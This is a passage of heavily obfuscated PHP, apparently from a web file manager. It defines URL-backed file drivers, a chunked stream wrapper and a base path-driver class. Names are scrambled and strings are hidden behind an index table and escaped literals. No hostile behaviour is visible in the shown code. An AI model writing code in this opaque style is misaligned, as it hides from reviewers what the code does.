$_SERVER[¿ÈˆÑ¸ä]; if ($è±ìñ¿ == $è‰°”ç°[12] || $è±ìñ¿ == $è‰°”ç°[8]) { return !0; } $ßô·İÓÙ = $this->_objectMeta($è±ìñ¿); return isset($ßô·İÓÙ[$è‰°”ç°[33]]) && $ßô·İÓÙ[$è‰°”ç°[33]] == $è‰°”ç°[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($›§¬âş« = false) { } public function exist($‹Å¿òÙ×) { $ÆÜô¸ı = $this->info($‹Å¿òÙ×); return $ÆÜô¸ı[$_SERVER[¿ÈˆÑ¸ä][233]]; } public function isFile($Ä¢Ùš‚Å) { $Í¤çƒö‡ = $this->info($Ä¢Ùš‚Å); return $Í¤çƒö‡[$_SERVER[¿ÈˆÑ¸ä][233]]; } public function isFolder($ãµÌ¹ƒÉ) { return !1; } public function size($œ…æ¸ñÏ) { $¬ìºË‡ = $this->info($œ…æ¸ñÏ); return $¬ìºË‡[$_SERVER[¿ÈˆÑ¸ä][79]]; } public function info($ê½Ç¨™) { return $this->infoParse($ê½Ç¨™); } public function infoAuth($³µ¨·Íâ) { return $this->infoParse($³µ¨·Íâ); } public function infoWithChildren($ÖÛãé¢Ù) { return $this->infoParse($ÖÛãé¢Ù); } public function infoFull($µÖå¬ ) { return $this->infoParse($µÖå¬ ); } private function infoParse($¡üèô•ê) { $®§¥Ë»î =& $_SERVER[¿ÈˆÑ¸ä]; $«á¬‡´ê = $this->header($¡üèô•ê); if (!$«á¬‡´ê || !$«á¬‡´ê[$®§¥Ë»î[833]]) { return !1; } $æôˆñëİ = _get($«á¬‡´ê, $®§¥Ë»î[413], 0); $Ø£üá„‹ = array($®§¥Ë»î[32] => $«á¬‡´ê[$®§¥Ë»î[32]], $®§¥Ë»î[87] => $¡üèô•ê, $®§¥Ë»î[33] => $®§¥Ë»î[231], $®§¥Ë»î[79] => intval($æôˆñëİ), $®§¥Ë»î[167] => get_path_ext($«á¬‡´ê[$®§¥Ë»î[32]]), $®§¥Ë»î[1599] => $æôˆñëİ > 0 && $«á¬‡´ê[$®§¥Ë»î[1746]], $®§¥Ë»î[1600] => !1); return $Ø£üá„‹; } private function header($¤³½´££) { $Ğä·¶ñÓ =& $_SERVER[¿ÈˆÑ¸ä]; if (isset(self::$_cacheHeader[$¤³½´££])) { return self::$_cacheHeader[$¤³½´££]; } $´£íÖÊ¯ = isset($GLOBALS[$Ğä·¶ñÓ[1747]]) ? $GLOBALS[$Ğä·¶ñÓ[1747]] : !1; $GLOBALS[$Ğä·¶ñÓ[1747]] = !0; self::$_cacheHeader[$¤³½´££] = url_header($¤³½´££); $GLOBALS[$Ğä·¶ñÓ[1747]] = $´£íÖÊ¯; return self::$_cacheHeader[$¤³½´££]; } public function hashSimple($ä£ï ¦£, $ îÙç“ = false) { $˜‘°³Òô =& $_SERVER[¿ÈˆÑ¸ä]; $‘áïéºÚ = $this->info($ä£ï ¦£); if (!$‘áïéºÚ || !$‘áïéºÚ[$˜‘°³Òô[233]]) { return !1; } $¥¯ßÅú— = $‘áïéºÚ[$˜‘°³Òô[79]]; $Š—ØƒÅ = 200; $¢Ù·Õ¶¶ = 50; if ($¥¯ßÅú— <= $Š—ØƒÅ * $¢Ù·Õ¶¶) { return md5($this->fileSubstr($ä£ï ¦£, 0, $¥¯ßÅú—)) . $¥¯ßÅú—; } $¾‘›÷ã° = intval($¥¯ßÅú— / $¢Ù·Õ¶¶); $£¬œßËĞ = $˜‘°³Òô[12]; $ª²“âñœ = timeFloat(); $„¯õüª = 15; for ($õƒèÜÙ = 0; $õƒèÜÙ < $¢Ù·Õ¶¶; $õƒèÜÙ++) { if (timeFloat() - $ª²“âñœ > $„¯õüª) { return !1; } $»¼§‰ó = $this->fileSubstr($ä£ï ¦£, $¾‘›÷ã° * $õƒèÜÙ, $Š—ØƒÅ); if (!$»¼§‰ó) { return !1; } $£¬œßËĞ .= $»¼§‰ó; } $£¬œßËĞ .= $this->fileSubstr($ä£ï ¦£, $¥¯ßÅú— - $Š—ØƒÅ, $Š—ØƒÅ); return md5($£¬œßËĞ) . $¥¯ßÅú—; } public function getContent($¦†ùŠ£“) { return $this->fileSubstr($¦†ùŠ£“); } public function fileSubstr($ó’’¥À, $ÅÖÂÃ¥ı = 0, $»à ¿Ï = -1) { $÷»ĞÒ =& $_SERVER[¿ÈˆÑ¸ä]; $éìŞÂ¨“ = $this->info($ó’’¥À); if (!$éìŞÂ¨“ || !$éìŞÂ¨“[$÷»ĞÒ[233]] && $éìŞÂ¨“[$÷»ĞÒ[79]] > 1024 * 1024 * 10) { return !1; } if ($»à ¿Ï === -1) { $»à ¿Ï = $éìŞÂ¨“[$÷»ĞÒ[79]]; } if ($»à ¿Ï == 0) { return $÷»ĞÒ[12]; } $¨˜Í©¹Œ = array($÷»ĞÒ[1748] . $ÅÖÂÃ¥ı . $÷»ĞÒ[873] . ($ÅÖÂÃ¥ı + $»à ¿Ï - 1)); $êÛ²³‚º = url_request($ó’’¥À, $÷»ĞÒ[1542], !1, $¨˜Í©¹Œ, !1, !1, 30); return $êÛ²³‚º[$÷»ĞÒ[1326]] ? $êÛ²³‚º[$÷»ĞÒ[1326]] : $÷»ĞÒ[12]; } public function download($·èĞÜÚÁ, $±‹çÜ‡ä) { Downloader::start($·èĞÜÚÁ, $±‹çÜ‡ä); return $±‹çÜ‡ä; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($•ÁÁ°ù³, $¢éÌ‰îŒ = '') { $this->info = $this->info($•ÁÁ°ù³); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¿ÈˆÑ¸ä][87]]; $this->pathOpen = $•ÁÁ°ù³; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$•ÁÁ°ù³])) { self::$_chunkBuffer[$•ÁÁ°ù³] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($º¤¹š­) { $­¹« éÀ = $this->fileSubstr($this->pose, $º¤¹š­); $this->pose += strlen($­¹« éÀ); return $­¹« éÀ; } public function stream_tell() { return $this->pose; } public function stream_seek($ø©˜’å·, $ßØÀÙ™) { $ºÂ¦¶®ù =& $_SERVER[¿ÈˆÑ¸ä]; if ($ßØÀÙ™ == SEEK_SET) { $this->pose = $ø©˜’å·; } else { if ($ßØÀÙ™ == SEEK_CUR) { $this->pose += $ø©˜’å·; } else { if ($ßØÀÙ™ == SEEK_END) { $this->pose = $this->info[$ºÂ¦¶®ù[79]] + intval($ø©˜’å·); } } } if ($ø©˜’å· < 0) { $this->pose = $this->info[$ºÂ¦¶®ù[79]] + $ø©˜’å·; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¿ÈˆÑ¸ä][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¦ ‘Æà, $ÖÇò) { $ÌÅè…Êú =& $_SERVER[¿ÈˆÑ¸ä]; $³Û½ Ö = $this->info($¦ ‘Æà); return array($ÌÅè…Êú[1448] => 0, $ÌÅè…Êú[1749] => 0, $ÌÅè…Êú[16] => 32768 + 511, $ÌÅè…Êú[1750] => 0, $ÌÅè…Êú[1751] => 0, $ÌÅè…Êú[1752] => 0, $ÌÅè…Êú[1753] => 0, $ÌÅè…Êú[79] => $³Û½ Ö[$ÌÅè…Êú[79]], $ÌÅè…Êú[1754] => $³Û½ Ö[$ÌÅè…Êú[1598]], $ÌÅè…Êú[1711] => $³Û½ Ö[$ÌÅè…Êú[88]], $ÌÅè…Êú[1710] => $³Û½ Ö[$ÌÅè…Êú[232]], $ÌÅè…Êú[1755] => 0, $ÌÅè…Êú[1756] => 0); } static $fileInfo = array(); public function info($ğƒïşŒ) { $‘ÒºÉ€• = $_SERVER[¿ÈˆÑ¸ä][1757]; if (isset(self::$fileInfo[$ğƒïşŒ])) { return self::$fileInfo[$ğƒïşŒ]; } if (substr($ğƒïşŒ, 0, strlen($‘ÒºÉ€•)) != $‘ÒºÉ€•) { return !1; } self::$fileInfo[$ğƒïşŒ] = IO::info(substr($ğƒïşŒ, strlen($‘ÒºÉ€•))); return self::$fileInfo[$ğƒïşŒ]; } public static function read($ÈûÉ‰Ë©, $‰ÄÃê…œ, $ ôğğœ») { if (!isset(self::$_fopenCache[$ÈûÉ‰Ë©])) { $†×¨˜Ê¡ = new StreamWrapperIO(); $†×¨˜Ê¡->stream_open($ÈûÉ‰Ë©); self::$_fopenCache[$ÈûÉ‰Ë©] = $†×¨˜Ê¡; } $†×¨˜Ê¡ = self::$_fopenCache[$ÈûÉ‰Ë©]; return $†×¨˜Ê¡->fileSubstr($‰ÄÃê…œ, $ ôğğœ»); } public static function _read($ÅµŸîŸÙ, $âª¶’áï, $ŸÈÎÛÙ™) { $ê“òÇóĞ =& $_SERVER[¿ÈˆÑ¸ä]; $¯œª–ú¼ = fopen($ÅµŸîŸÙ, $ê“òÇóĞ[1602]); if (!$¯œª–ú¼) { return $ê“òÇóĞ[12]; } $„ÒöÏ§‹ = 8192; fseek($¯œª–ú¼, $âª¶’áï, SEEK_SET); $¿½àã™Š = $ê“òÇóĞ[12]; $Í²õĞî’ = 0; while ($Í²õĞî’ < $ŸÈÎÛÙ™) { $¤Ìêø = min($„ÒöÏ§‹, $ŸÈÎÛÙ™ - $Í²õĞî’); $¿½àã™Š .= fread($¯œª–ú¼, $¤Ìêø); $Í²õĞî’ += $¤Ìêø; } fclose($¯œª–ú¼); return $¿½àã™Š; } public function fileSubstr($î€ïåçˆ, $¶³‘ªØñ) { $¼„Ü–€› =& $_SERVER[¿ÈˆÑ¸ä]; $–Õöìäû = $this->info[$¼„Ü–€›[79]]; $™ÆÔî–¯ = $î€ïåçˆ; $Šï¡‘ˆæ = $¶³‘ªØñ; if ($î€ïåçˆ < 0) { $î€ïåçˆ = $–Õöìäû + $î€ïåçˆ; } if ($¶³‘ªØñ === !1) { $¶³‘ªØñ = $–Õöìäû - $î€ïåçˆ; } if ($î€ïåçˆ + $¶³‘ªØñ > $–Õöìäû) { $¶³‘ªØñ = $–Õöìäû - $î€ïåçˆ; } if ($¶³‘ªØñ <= 0) { return $¼„Ü–€›[12]; } if ($î€ïåçˆ < 0 || $î€ïåçˆ >= $–Õöìäû || $¶³‘ªØñ <= 0 || $¶³‘ªØñ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\x6c\x65\122\145\x61\144\40\145\162\x72\157\162\x21\40\163\164\x61\x72\x74\75{$î€ïåçˆ}\73\x6c\x65\156\147\x74\150\75{$¶³‘ªØñ}\x3b\x20\x73\x69\x7a\145\x3d{$–Õöìäû}\73"); } $¸”¹×±í = 64 * 1024; $’Îª—©¼ =& self::$_chunkBuffer[$this->path]; if (!$’Îª—©¼) { $’Îª—©¼ = array(); } $Ô×ÙÏ×¬ = 0; $£ÃÚ¿Óô = 0; $Ìä´«¦Ä = $¼„Ü–€›[12]; foreach ($’Îª—©¼ as $Ô×ÙÏ×¬ => $Ìä´«¦Ä) { $Ô×ÙÏ×¬ = intval($Ô×ÙÏ×¬); $£ÃÚ¿Óô = $Ô×ÙÏ×¬ + strlen($Ìä´«¦Ä); if ($î€ïåçˆ >= $£ÃÚ¿Óô) { continue; } if ($î€ïåçˆ >= $Ô×ÙÏ×¬ && $î€ïåçˆ + $¶³‘ªØñ <= $£ÃÚ¿Óô) { return substr($Ìä´«¦Ä, $î€ïåçˆ - $Ô×ÙÏ×¬, $¶³‘ªØñ); } break; } if (count($’Îª—©¼) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($¼„Ü–€›[1758], $¼„Ü–€›[1759] . count($’Îª—©¼) . "\x3b\163\164\x61\162\164\x3d{$î€ïåçˆ}\54\x6c\145\x6e\147\164\150\75{$¶³‘ªØñ}\73\160\x6f\x73\145\72{$Ô×ÙÏ×¬}\176{$£ÃÚ¿Óô}"); throw new Exception($¼„Ü–€›[1760]); } $ÔÕªƒ·€ = intval($î€ïåçˆ / $¸”¹×±í) * $¸”¹×±í; $½®ß¸£ = ceil(($î€ïåçˆ + $¶³‘ªØñ) / $¸”¹×±í) * $¸”¹×±í - $ÔÕªƒ·€; $––€¯‘ = IO::fileSubstr($this->path, $ÔÕªƒ·€, $½®ß¸£); $’Îª—©¼[$ÔÕªƒ·€ . $¼„Ü–€›[12]] = $––€¯‘; ksort($’Îª—©¼); $´ †Ÿ§¡ = substr($––€¯‘, $î€ïåçˆ - $ÔÕªƒ·€, $¶³‘ªØñ); return $´ †Ÿ§¡; } private function log($’¡â‘õÍ, $™Œ™ßÅ¬) { $Õú‘Ï¡´ =& $_SERVER[¿ÈˆÑ¸ä]; $·õ¹ƒ­¢ = timeFloat() - $this->timeStart; write_log(sprintf($Õú‘Ï¡´[1761], $’¡â‘õÍ, $this->info[$Õú‘Ï¡´[32]], $·õ¹ƒ­¢, $™Œ™ßÅ¬), $Õú‘Ï¡´[1304]); } } goto dÙÉ«Â±½‚; Càšš–ßË: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $™æ‡Ïö× =& $_SERVER[¿ÈˆÑ¸ä]; $this->objectDriver = array($™æ‡Ïö×[60], $™æ‡Ïö×[61], $™æ‡Ïö×[62], $™æ‡Ïö×[63], $™æ‡Ïö×[64], $™æ‡Ïö×[65], $™æ‡Ïö×[66], $™æ‡Ïö×[67], $™æ‡Ïö×[68], $™æ‡Ïö×[69], $™æ‡Ïö×[70], $™æ‡Ïö×[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($©“¶·’©) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($©“¶·’©, $_SERVER[¿ÈˆÑ¸ä][8]); } return $©“¶·’©; } public function iconvApp($çŠ‹üŞ) { return $çŠ‹üŞ; } public function iconvSystem($¦ÛøŠóâ) { return $¦ÛøŠóâ; } public function iconvTo($¡ÈØ¾ì, $Ëš¹Á†¯, $æÃ‘ûÄ•) { $õ„ÖÇ—İ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$¡ÈØ¾ì || !function_exists($õ„ÖÇ—İ[72])) { return $¡ÈØ¾ì; } static $ê‰Š«ìŠ = array(); $âØ¡ı = $Ëš¹Á†¯ . $õ„ÖÇ—İ[73] . $æÃ‘ûÄ• . $õ„ÖÇ—İ[74] . $¡ÈØ¾ì; if (isset($ê‰Š«ìŠ[$âØ¡ı])) { return $ê‰Š«ìŠ[$âØ¡ı]; } if (function_exists($õ„ÖÇ—İ[75])) { $”®ŞÔ¨ = @mb_convert_encoding($¡ÈØ¾ì, $æÃ‘ûÄ•, $Ëš¹Á†¯); } else { $”®ŞÔ¨ = @iconv($Ëš¹Á†¯, $æÃ‘ûÄ•, $¡ÈØ¾ì); } $”®ŞÔ¨ = $”®ŞÔ¨ ? $”®ŞÔ¨ : $¡ÈØ¾ì; if (strstr($”®ŞÔ¨, $õ„ÖÇ—İ[76])) { $”®ŞÔ¨ = str_replace($õ„ÖÇ—İ[76], $õ„ÖÇ—İ[11], $”®ŞÔ¨); } $ê‰Š«ìŠ[$Ëš¹Á†¯ . $õ„ÖÇ—İ[73] . $æÃ‘ûÄ• . $õ„ÖÇ—İ[74] . $¡ÈØ¾ì] = $”®ŞÔ¨; $ê‰Š«ìŠ[$æÃ‘ûÄ• . $õ„ÖÇ—İ[73] . $Ëš¹Á†¯ . $õ„ÖÇ—İ[74] . $¡ÈØ¾ì] = $¡ÈØ¾ì; $ê‰Š«ìŠ[$æÃ‘ûÄ• . $õ„ÖÇ—İ[73] . $Ëš¹Á†¯ . $õ„ÖÇ—İ[74] . $”®ŞÔ¨] = $¡ÈØ¾ì; $ê‰Š«ìŠ[$Ëš¹Á†¯ . $õ„ÖÇ—İ[73] . $æÃ‘ûÄ• . $õ„ÖÇ—İ[74] . $”®ŞÔ¨] = $”®ŞÔ¨; return $”®ŞÔ¨; } public function getPathInner($Êí¯î¥Ã) { $üã¥˜èé = IO::init($Êí¯î¥Ã); return $üã¥˜èé->path; } public function getPathOuter($‰Œ¶©ê¹) { $ÈĞêŒÊ´ =& $_SERVER[¿ÈˆÑ¸ä]; $„¬˜’£ = strlen(trim($this->pathBase, $ÈĞêŒÊ´[8])); $‰Œ¶©ê¹ = substr(trim($‰Œ¶©ê¹, $ÈĞêŒÊ´[8]), $„¬˜’£); return $this->pathDriver . $ÈĞêŒÊ´[8] . ltrim($‰Œ¶©ê¹, $ÈĞêŒÊ´[8]); } public function isParentOf($ËÂøíéï, $ñ“¨şû») { $¼¡—“ªÅ =& $_SERVER[¿ÈˆÑ¸ä]; $ËÂøíéï = rtrim(strtolower($ËÂøíéï), $¼¡—“ªÅ[8]) . $¼¡—“ªÅ[8]; $ñ“¨şû» = rtrim(strtolower($ñ“¨şû»), $¼¡—“ªÅ[8]) . $¼¡—“ªÅ[8]; $è±››»Ü = strpos($ñ“¨şû», $ËÂøíéï) === 0; return $è±››»Ü; } public function getType() { $ÛìÏ¢«‹ =& $_SERVER[¿ÈˆÑ¸ä]; $Šù¨¢» = str_replace($ÛìÏ¢«‹[77], $ÛìÏ¢«‹[12], get_class($this)); return strtolower($Šù¨¢»); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ÿáï³°¦, $°º„Ò’Û) { $ÌÏì§Ø¡ =& $_SERVER[¿ÈˆÑ¸ä]; $¤¥ë”Ä  = rtrim($Ÿáï³°¦, $ÌÏì§Ø¡[8]) . $ÌÏì§Ø¡[8] . $°º„Ò’Û; $¤øÏª½ = $this->exist($¤¥ë”Ä ); return $¤øÏª½ ? $¤¥ë”Ä  : !1; } public function setModifyTime($ë¯—Òâü, $íÑˆÓ¹â = '') { } public function renameObject($±˜£Ò‘½, $¼ùÓ§¸Ã) { $˜ä…üî = $¼ùÓ§¸Ã; $±˜£Ò‘½ = $this->getPathOuter($±˜£Ò‘½); $¼ùÓ§¸Ã = $this->pathFather($±˜£Ò‘½) . $¼ùÓ§¸Ã; $„öú€öÄ = IO::copy($±˜£Ò‘½, $this->pathFather($±˜£Ò‘½), REPEAT_RENAME_FOLDER, $˜ä…üî); if ($„öú€öÄ) { IO::remove($±˜£Ò‘½); } return $„öú€öÄ ? $¼ùÓ§¸Ã : !1; } public function tempFile($•îê†ğ¶ = '', $ÇÏ€¹şŞ = '') { if (!$•îê†ğ¶) { $•îê†ğ¶ = rand_string(15); } $˜›»–£ = TEMP_FILES . rand_string(15) . $_SERVER[¿ÈˆÑ¸ä][8]; @mkdir($˜›»–£, DEFAULT_PERRMISSIONS, !0); $œò°ê¥à = $˜›»–£ . $•îê†ğ¶; @touch($œò°ê¥à); if ($ÇÏ€¹şŞ) { file_put_contents($œò°ê¥à, $ÇÏ€¹şŞ); } return $œò°ê¥à; } public function tempFileRemve($Ãñ÷éã‡) { @unlink($Ãñ÷éã‡); @rmdir($this->pathFather($Ãñ÷éã‡)); } public function mkfile($ƒä‘†ç¿, $”Ö˜û—ü = '', $üØ“«“ä = REPEAT_RENAME) { } public function mkdir($õÄê«‚¹, $ÃÑÔœÕ’ = REPEAT_SKIP) { } public function delFile($®öï’»Á) { } public function delFolder($øÂœŠ–å) { } public function copyFile($ø¸­×ş, $ÚëÑ´¾³) { } public function moveFile($ˆªŠ¹Á˜, $Í¹›ë­¾) { } public function remove($ÀŸ‘ËÅ‚) { if ($this->isFile($ÀŸ‘ËÅ‚)) { return $this->delFile($ÀŸ‘ËÅ‚); } return $this->delFolder($ÀŸ‘ËÅ‚); } public function rename($´–«†ÌÙ, $å›—ñÌ“) { } public function exist($îõÙ‘Ê¹) { } public function isFile($›ú‰ø•) { } public function isFolder($“Ÿ·Ç¤) { } public function size($ï¬’Öˆ˜) { } public function info($›…¢ü) { } public function infoSimple($ÚÖÀÛøã) { return $this->info($ÚÖÀÛøã); } public function infoAuth($°¥§©ƒ™) { return $this->info($°¥§©ƒ™); } public function infoFull($¸ˆ†ûœ‡) { return $this->info($¸ˆ†ûœ‡); } public function infoFullSimple($şùÒ¾™) { return $this->info($şùÒ¾™); } public function infoWithChildren($ÆÌ‚¾ôñ) { $Ä×é°¥› =& $_SERVER[¿ÈˆÑ¸ä]; static $‡ğúõ·“ = array(); if (isset($‡ğúõ·“[$ÆÌ‚¾ôñ])) { return $‡ğúõ·“[$ÆÌ‚¾ôñ]; } $ä‡êšÄ‡ = $this->info($ÆÌ‚¾ôñ); if ($ä‡êšÄ‡ && $ä‡êšÄ‡[$Ä×é°¥›[33]] == $Ä×é°¥›[78]) { $‰æ¡²·Ÿ = array($Ä×é°¥›[79] => 0, $Ä×é°¥›[80] => 0, $Ä×é°¥›[81] => 0); $this->infoChildren($ÆÌ‚¾ôñ, $‰æ¡²·Ÿ); $ä‡êšÄ‡[$Ä×é°¥›[79]] = $‰æ¡²·Ÿ[$Ä×é°¥›[79]]; $ä‡êšÄ‡[$Ä×é°¥›[82]] = array($Ä×é°¥›[83] => $‰æ¡²·Ÿ[$Ä×é°¥›[80]], $Ä×é°¥›[84] => $‰æ¡²·Ÿ[$Ä×é°¥›[81]]); $‡ğúõ·“[$ÆÌ‚¾ôñ] = $ä‡êšÄ‡; } return $ä‡êšÄ‡; } public function listPath($åÔ´—Ä¢, $Ó ùş¶ = false) { } public function has($™‡™òÖ÷, $…Ó¡İÛ– = false, $ı˜„òËÆ = false) { } public function canRead($¹Åù¾º) { } public function canWrite($ÉøÌ°­) { } public function getContent($±Äùã¹²) { } public function setContent($¥Âù˜È, $½Ç³»‚É = '') { } protected function infoChildren($¶¡Ö¥¤°, &$ãÈÕ–£§) { $Òˆ» =& $_SERVER[¿ÈˆÑ¸ä]; check_abort_echo(); $³êêòÙŸ = $this->listPath($¶¡Ö¥¤°, !0); $³êêòÙŸ = array_merge($³êêòÙŸ[$Òˆ»[85]], $³êêòÙŸ[$Òˆ»[86]]); foreach ($³êêòÙŸ as $Ì”öğê°) { if ($Ì”öğê°[$Òˆ»[33]] == $Òˆ»[78]) { $ãÈÕ–£§[$Òˆ»[81]]++; $±Úˆ™à = $this->getPathInner($Ì”öğê°[$Òˆ»[87]]); $this->infoChildren($±Úˆ™à, $ãÈÕ–£§); } else { $ãÈÕ–£§[$Òˆ»[80]]++; $ãÈÕ–£§[$Òˆ»[79]] += $Ì”öğê°[$Òˆ»[79]]; } } } public function fileSubstr($°Û‘Â‹ô, $‡˜Äéá¦, $¦ú¯ŒíÏ) { } public function listAll($åêŒ‰í—) { } public function listAllMake($ğÔ›Œà, &$ë›š ËÂ) { $çâÓ´ó =& $_SERVER[¿ÈˆÑ¸ä]; check_abort_echo(); $ ½¦åêÂ = $this->listPath($ğÔ›Œà, !0); if (!$ ½¦åêÂ) { return; } $Ä¼¼×¤± = array_merge($ ½¦åêÂ[$çâÓ´ó[85]], $ ½¦åêÂ[$çâÓ´ó[86]]); foreach ($Ä¼¼×¤± as $‰˜ƒ¦˜ü) { $ˆâ±Š°è = $‰˜ƒ¦˜ü[$çâÓ´ó[33]] == $çâÓ´ó[78]; $£©â«‰ = array($çâÓ´ó[87] => $‰˜ƒ¦˜ü[$çâÓ´ó[87]], $çâÓ´ó[78] => $ˆâ±Š°è); if (isset($‰˜ƒ¦˜ü[$çâÓ´ó[79]])) { $£©â«‰[$çâÓ´ó[79]] = $‰˜ƒ¦˜ü[$çâÓ´ó[79]]; } if (isset($‰˜ƒ¦˜ü[$çâÓ´ó[88]])) { $£©â«‰[$çâÓ´ó[88]] = $‰˜ƒ¦˜ü[$çâÓ´ó[88]]; } if (!$ˆâ±Š°è) { $ë›š ËÂ[] = $£©â«‰; continue; } $ë›š ËÂ[] = $£©â«‰; $·ÒÉõÔ« = $‰˜ƒ¦˜ü[$çâÓ´ó[87]]; $¾µ˜¢ú = $this->pathDriver; if (substr($‰˜ƒ¦˜ü[$çâÓ´ó[87]], 0, strlen($¾µ˜¢ú)) == $¾µ˜¢ú) { $·ÒÉõÔ« = substr($·ÒÉõÔ«, strlen($¾µ˜¢ú)); } $this->listAllMake($·ÒÉõÔ«, $ë›š ËÂ); } } public function listAllSimple($ıÎ‡½®¨, $Ã‚§îÍ = false) { $îÈâËŸ– = $this->listAll($ıÎ‡½®¨); return $this->listAllSimpleMake($îÈâËŸ–, $this->getPathOuter($ıÎ‡½®¨), $Ã‚§îÍ); } public function listAllSimpleMake($Åùú×¼¶, $¢§Ó¶°ç, $‘Í†âêé) { $¤ğ®¡˜â =& $_SERVER[¿ÈˆÑ¸ä]; $öŞ™¿æ = array(); $¢§Ó¶°ç = rtrim(get_path_father($¢§Ó¶°ç), $¤ğ®¡˜â[8]) . $¤ğ®¡˜â[8]; foreach ($Åùú×¼¶ as $×îŠßş½) { $ÂºıÏ = array($¤ğ®¡˜â[87] => $×îŠßş½[$¤ğ®¡˜â[87]], $¤ğ®¡˜â[89] => $×îŠßş½[$¤ğ®¡˜â[87]], $¤ğ®¡˜â[78] => $×îŠßş½[$¤ğ®¡˜â[78]]); if (isset($×îŠßş½[$¤ğ®¡˜â[79]]) && !$×îŠßş½[$¤ğ®¡˜â[78]]) { $ÂºıÏ[$¤ğ®¡˜â[79]] = $×îŠßş½[$¤ğ®¡˜â[79]]; } if (isset($×îŠßş½[$¤ğ®¡˜â[88]])) { $ÂºıÏ[$¤ğ®¡˜â[88]] = $×îŠßş½[$¤ğ®¡˜â[88]]; } if (is_array($×îŠßş½[$¤ğ®¡˜â[90]])) { $ÂºıÏ[$¤ğ®¡˜â[89]] = $×îŠßş½[$¤ğ®¡˜â[90]][$¤ğ®¡˜â[87]]; $ÂºıÏ[$¤ğ®¡˜â[79]] = $×îŠßş½[$¤ğ®¡˜â[90]][$¤ğ®¡˜â[79]]; $ÂºıÏ[$¤ğ®¡˜â[88]] = $×îŠßş½[$¤ğ®¡˜â[90]][$¤ğ®¡˜â[88]]; } else { if (substr($×îŠßş½[$¤ğ®¡˜â[87]], 0, strlen($¢§Ó¶°ç)) == $¢§Ó¶°ç) { $ÂºıÏ[$¤ğ®¡˜â[87]] = substr($×îŠßş½[$¤ğ®¡˜â[87]], strlen($¢§Ó¶°ç)); } } $ŞÉÍÔ¾ş = $×îŠßş½[$¤ğ®¡˜â[78]] ? $¤ğ®¡˜â[8] : $¤ğ®¡˜â[12]; $ÂºıÏ[$¤ğ®¡˜â[89]] = rtrim($ÂºıÏ[$¤ğ®¡˜â[89]], $¤ğ®¡˜â[8]) . $ŞÉÍÔ¾ş; $ÂºıÏ[$¤ğ®¡˜â[87]] = $¤ğ®¡˜â[8] . trim($ÂºıÏ[$¤ğ®¡˜â[87]], $¤ğ®¡˜â[8]) . $ŞÉÍÔ¾ş; if (!$‘Í†âêé) { $æşÇšîò = explode($¤ğ®¡˜â[8], trim($ÂºıÏ[$¤ğ®¡˜â[87]], $¤ğ®¡˜â[8])); $ÂºıÏ[$¤ğ®¡˜â[87]] = $¤ğ®¡˜â[8] . implode($¤ğ®¡˜â[8], array_slice($æşÇšîò, 1)) . $ŞÉÍÔ¾ş; } $öŞ™¿æ[] = $ÂºıÏ; } return array_sort_by($öŞ™¿æ, $¤ğ®¡˜â[87]); } public function upload($ôê²ä³, $²Á™óƒ˜, $®¸œé½Ÿ = false, $Ç§œÄ•Î = REPEAT_REPLACE) { } public function uploadFileByID($ç¿÷§÷ˆ, $´Æ¦ÔÂ, $­¢œÀÑ¨) { } public function uploadFileByPath($à İ›ñ, $øŞÖ’Ü­, $¶Áö«ÂÉ = array()) { } public function isUploadServer() { $ ì³§”î =& $_SERVER[¿ÈˆÑ¸ä]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ ì³§”î[91]) { return !0; } return $GLOBALS[$ ì³§”î[6]][$ ì³§”î[92]][$ ì³§”î[93]]; } public function isFileOutServer() { $¬æ¬¦êã =& $_SERVER[¿ÈˆÑ¸ä]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¬æ¬¦êã[91]) { return !0; } return $GLOBALS[$¬æ¬¦êã[6]][$¬æ¬¦êã[92]][$¬æ¬¦êã[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($İ¨ºÅÕï) { $¢œ¶º³ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->isCdnHost()) { return $İ¨ºÅÕï; } return str_replace(trim(get_url_root($İ¨ºÅÕï), $¢œ¶º³[8]), trim($this->cdnHost, $¢œ¶º³[8]), $İ¨ºÅÕï); } public function uploadLink($Õ¯êöú, $¯ÚÜ˜ßí = 0) { $ƒÂè‡İı =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->isUploadServer()) { return; } $¸­¡»á‡ = $this->getType(); if (!in_array($¸­¡»á‡, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $„Àúá•ù = 1024 * 1024 * 10; $´†Ä†¾Ú = (!$¯ÚÜ˜ßí ? 1 : ceil($¯ÚÜ˜ßí / pow(1024, 3))) * 3600 * 4; if ($¯ÚÜ˜ßí <= $„Àúá•ù) { $Ú¡«ù–¡ = $this->uploadFormData($Õ¯êöú, $´†Ä†¾Ú); } else { $Ú¡«ù–¡ = $this->uploadMultiData($Õ¯êöú, $´†Ä†¾Ú); } if ($Ú¡«ù–¡) { $Ú¡«ù–¡[$ƒÂè‡İı[95]] = $Õ¯êöú; $Ú¡«ù–¡[$ƒÂè‡İı[96]] = $¸­¡»á‡; } return $Ú¡«ù–¡; } public function uploadFormData($ï‰¯Åñ, $“À‚¼Ü¨ = 3600) { 